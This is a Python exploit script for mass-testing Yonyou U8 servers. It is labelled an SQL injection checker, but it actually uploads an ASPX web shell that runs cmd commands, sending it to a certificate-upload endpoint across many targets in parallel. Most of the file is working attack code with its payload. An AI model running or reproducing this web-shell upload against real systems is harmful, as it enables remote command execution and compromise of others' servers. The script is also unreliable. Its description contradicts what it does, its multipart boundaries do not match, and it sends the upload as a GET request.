import requests
import argparse

requests.packages.urllib3.disable_warnings()
from multiprocessing import Pool


def main():
    banner = """
    _   _        .      .      |           #   ___          _   _        .      .       _   _     
   (_)-(_)     .  .:::.        |.===.      #  <_*_>        (_)-(_)     .  .:::.        '\\-//`    
    (o o)        :(o o):  .    {}o o{}     #  (o o)         (o o)        :(o o):  .     (o o)     
ooO--(_)--Ooo-ooO--(_)--Ooo-ooO--(_)--Ooo--8---(_)--Ooo-ooO--(_)--Ooo-ooO--(_)--Ooo-ooO--(_)--Ooo-
"""
    print(banner)
    parser = argparse.ArgumentParser(description='用友U8SQL注入漏洞检测')
    parser.add_argument('-u','--url', type=str, help='输入要检测URL')
    parser.add_argument('-f','--file', type=str, help='输入要批量检测的文本')
    args = parser.parse_args()
    url = args.url
    file = args.file
    targets = []
    if url:
        check(args.url)
    elif file:
        f = open(file, 'r')
        for i in f.readlines():
            i = i.strip()
            if 'http' in i:
                targets.append(i)
            else:
                i = f"http://{i}"
                targets.append(i)
    pool = Pool(30)
    pool.map(check, targets)
    pool.close()
def check(target):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryTqkdY1lCvbvpmown'
    }
    data = '''------WebKitFormBoundaryaKljzbg49Mq4ggLz
Content-Disposition: form-data; name="file"; filename="rce.aspx"
Content-Type: image/jpeg

<%@ Page Language="Jscript" validateRequest="false" %><%var c=new System.Diagnostics.ProcessStartInfo("cmd");var e=new System.Diagnostics.Process();var out:System.IO.StreamReader,EI:System.IO.StreamReader;c.UseShellExecute=false;c.RedirectStandardOutput=true;c.RedirectStandardError=true;e.StartInfo=c;c.Arguments="/c " + Request.Item["cmd"];e.Start();out=e.StandardOutput;EI=e.StandardError;e.Close();Response.Write(out.ReadToEnd() + EI.ReadToEnd());System.IO.File.Delete(Request.PhysicalPath);Response.End();%>
------WebKitFormBoundaryaKljzbg49Mq4ggLz
Content-Disposition: form-data; name="TruckNo";

1
------WebKitFormBoundaryaKljzbg49Mq4ggLz
Content-Disposition: form-data; name="Cert_Type";

1
------WebKitFormBoundaryaKljzbg49Mq4ggLz--
    '''
    try:
        response = requests.get(f'{target}/MsWlTruck/CertUpload',headers=headers,data=data,verify=False,timeout=5)
        if response.status_code == 200 and 'Success' in response.text:
            print(f"[!]{target}存在漏洞")
        else:
            print(f"[*]{target}不存在漏洞")
    except Exception as e:
        pass
if __name__ == '__main__':
    main()